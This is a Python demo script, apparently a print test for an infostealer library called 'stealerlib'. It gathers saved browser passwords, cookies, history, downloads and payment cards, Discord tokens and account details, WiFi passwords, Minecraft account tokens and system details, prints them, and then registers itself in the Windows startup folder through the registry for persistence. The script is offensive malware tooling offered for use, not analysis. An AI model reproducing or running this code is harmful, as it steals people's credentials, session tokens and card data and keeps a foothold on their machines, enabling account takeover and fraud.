#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: print_test.py
"""

from stealerlib.system import System
from stealerlib.browser import Browser
from stealerlib.registry import Registry

from stealerlib.apps.discord import Discord
from stealerlib.apps.minecraft import Minecraft

            # default on commands is True (browser.get_passwords())
conv = False
            # if True, functions will return a list of values
            # as opposed to when False, where the functions will return
            # an interactive StealerLib object

            # Example on how to iterate through an object vs. list of values

            # for site in history:
            #     url = site[0]  # if conv=True
            #     url = site.url # if conv=False

            # for login in passwords:
            #     password = login[3]       # if conv=True
            #     password = login.password # if conv=False

            # etc...
            # please use the StealerLib GitHub wiki for more information on how to use StealerLib objects -
            # as opposed to converting them before using their values

if __name__ == '__main__':
    system    = System()
    browser   = Browser()
    registry  = Registry()
    discord   = Discord()
    minecraft = Minecraft()

    passwords = browser.get_passwords(conv=conv)
    print('Browser Passwords:', passwords, '\n') # conv=True ->  [(url, username, password), ...]
                                                 # conv=False -> [BrowserTypes.Login, ...]

    cookies = browser.get_cookies(conv=conv)
    print('Browser Cookies:', cookies, '\n') # conv=True ->  [(host, expires?, expire_date, path, name, value), ...]
                                             # conv=False -> [BrowserTypes.Cookie, ...]

    history = browser.get_history(conv=conv)
    print('Browser History:', history, '\n') # conv=True ->  [(site_url, title, timestamp), ...]
                                             # conv=False -> [BrowserTypes.Site, ...]

    downloads = browser.get_downloads(conv=conv)
    print('Browser Downloads:', downloads, '\n') # conv=True ->  [(tab_url, local_path), ...]
                                                 # conv=False -> [BrowserTypes.Download, ...]

    cards = browser.get_cards(conv=conv)
    print('Browser Cards:', cards, '\n') # conv=True ->  [(name, month, year, number, date_modified), ...]
                                         # conv=False -> [BrowserTypes.Card, ...]

    discord.get_tokens(conv=conv)
    print('Discord Tokens:', discord.tokens, '\n') # conv=True ->  [token1, token2, ...]
                                                   # conv=False -> [DiscordTypes.Token, ...]

    discord.get_token_information(discord.tokens, conv=conv)
    print('Discord Accounts:', discord.accounts, '\n') # conv=True ->  [(id, token, username, discriminator, email, phone), ...]
                                                       # conv=False -> [DiscordTypes.Token, ...]

    system.get_network_interfaces(conv=conv)
    print('Network Interfaces:', system.interfaces, '\n') # conv=True ->  [(name, [addresses]), ...]
                                                          # conv=False ->  [SystemTypes.NetworkInterface, ...]

    system.get_wifi_passwords(conv=conv)
    print('WiFi Credentials:', system.credentials, '\n') # conv=True ->  [(ssid, password), ...]
                                                         # conv=False -> [SystemTypes.SSID, ...]

    system.get_processes(conv=conv)
    print('System Processes:', system.processes, '\n') # conv=True ->  [(pid, name, status, parent_process, [child_processes]), ...]
                                                       # conv=False -> [SystemTypes.Process, ...]

    system.get_partitions(conv=conv)
    print('System Partitions:', system.partitions, '\n') # conv=True ->  [(device, mountpoint, filesystem, maxpaths, maxfiles), ...]
                                                         # conv=False -> [SystemTypes.Partition, ...]

    minecraft.get_accounts(conv=conv)
    print('Minecraft Accounts:', minecraft.accounts, '\n') # conv=True ->  [(email, username, uuid, token), ...]
                                                           # conv=False -> [MinecraftTypes.Account, ...]

    registry.get_installed_programs(conv=conv)
    print('Installed Programs:', registry.programs, '\n') # conv=True ->  [(email, username, uuid, token), ...]
                                                          # conv=False -> [RegistryTypes.Program, ...]

    print("Adding print_test.py to the startup folder via registry...\n")
    file_added = registry.add_file_to_startup("C:\\Users\\maxsi\\OneDrive\\Desktop\\Programming\\GitHub\\stealerlib\\print_test.py")
    print('File added to startup:', file_added, '\n')

    #print(system.comp_info,
          #system.os_info,
          #system.proc_info,
          #system.gpu_info)